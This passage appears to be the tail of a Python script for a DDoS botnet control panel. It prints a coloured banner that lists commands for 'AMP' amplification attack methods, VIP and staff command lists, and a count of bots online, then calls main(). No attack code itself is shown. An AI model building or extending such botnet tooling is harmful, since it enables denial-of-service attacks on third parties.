\r\033[38;5;201m║ \033[38;5;202m.ipmi \033[38;5;201m- \033[38;5;202mAMP Attack Methods v2    \033[38;5;201m║ ║ \033[38;5;202mDESC\033[38;5;201m: \033[38;5;202mNET-WSS                           \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.vip \033[38;5;201m-\033[38;5;202m VIP Command List          \033[38;5;201m║ ║ \033[38;5;202mVERSION\033[38;5;201m: \033[38;5;202mARCEUS_I_BETA_VERSION_X        \033[38;5;201m║\r\033[38;5;201m║ \033[38;5;202m.staff\033[38;5;201m - \033[38;5;202mAdmin Command List      \033[38;5;201m║ ║ \033[38;5;202mSUBSTRATE\033[38;5;201m: \033[38;5;202mVERSION IV                   \033[38;5;201m║\r\033[38;5;201m║ \033[38;5;202m.bots \033[38;5;201m- \033[38;5;202mDisplays Devices Online  \033[38;5;201m║ ║ \033[38;5;202mSCKET_INTERPRET\033[38;5;201m: \033[38;5;202mINSTANCE_II            \033[38;5;201m║
\r\033[38;5;201m╚══════════════════════════════════╝ ╚═════════════════════════════════════════╝"""
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

